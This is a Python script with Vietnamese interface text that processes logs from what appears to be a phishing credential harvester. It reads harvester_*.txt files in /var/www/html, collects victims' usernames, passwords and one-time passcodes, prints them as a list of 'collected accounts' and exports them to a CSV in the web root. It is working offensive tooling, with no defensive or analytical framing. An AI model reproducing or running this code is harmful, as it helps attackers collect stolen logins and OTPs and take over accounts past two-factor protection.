import glob
import argparse
import os
from pathlib import Path
from datetime import datetime

def parse_logs(log_dir="/var/www/html", username_filter=None):
    log_files = glob.glob(f"{log_dir}/harvester_*.txt")
    entries = []
    seen = set()

    for file_path in log_files:
        current = {}
        file_time = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime("%Y-%m-%d %H:%M:%S")

        with open(file_path, "r") as f:
            for line in f:
                line = line.strip()
                if not line.startswith("PARAM:"):
                    continue

                parts = line.replace("PARAM:", "").strip().split("=", 1)
                if len(parts) != 2:
                    continue

                key, value = parts[0].strip(), parts[1].strip()

                if key.lower() == "username":
                    current["username"] = value
                elif key.lower() == "password":
                    current["password"] = value
                elif key.lower() == "otp":
                    current["otp"] = value

                if "username" in current and "password" in current and "otp" in current:
                    key_tuple = (current["username"].lower(), current["password"], current["otp"])
                    if key_tuple not in seen:
                        if not username_filter or current["username"].lower() == username_filter.lower():
                            entries.append((current["username"], current["password"], current["otp"], file_time))
                            seen.add(key_tuple)
                    current = {}

    return entries


def print_table(entries):
    print("\n📋 DANH SÁCH TÀI KHOẢN THU THẬP")
    print("-" * 85)
    print(f"{'STT':<5} {'Username':<20} {'Password':<20} {'OTP':<8} {'Thời gian'}")
    print("-" * 85)
    for i, (user, pw, otp, ts) in enumerate(entries, 1):
        print(f"{i:<5} {user:<20} {pw:<20} {otp:<8} {ts}")
    print("-" * 85)


def export_csv(entries, filename):
    with open(filename, "w") as f:
        f.write("username,password,otp,time\n")
        for u, p, o, t in entries:
            f.write(f"{u},{p},{o},{t}\n")


def main():
    parser = argparse.ArgumentParser(description="📥 Phân tích log từ harvester")
    parser.add_argument(
        "-u", "--username",
        help="Chỉ lọc theo username (ví dụ: minhthu)"
    )
    parser.add_argument(
        "--desc",
        action="store_true",
        help="Sắp xếp theo thời gian mới nhất trước (giảm dần)"
    )
    args = parser.parse_args()

    entries = parse_logs(username_filter=args.username)

    if not entries:
        print("⚠️  Không tìm thấy dữ liệu phù hợp.")
        return

    # Sắp xếp theo thời gian
    entries.sort(key=lambda x: datetime.strptime(x[3], "%Y-%m-%d %H:%M:%S"), reverse=args.desc)

    print_table(entries)

    output_file = Path("/var/www/html/users.csv")
    export_csv(entries, output_file)
    print(f"\n✅ Đã lưu kết quả vào: {output_file}")


if __name__ == "__main__":
    main()
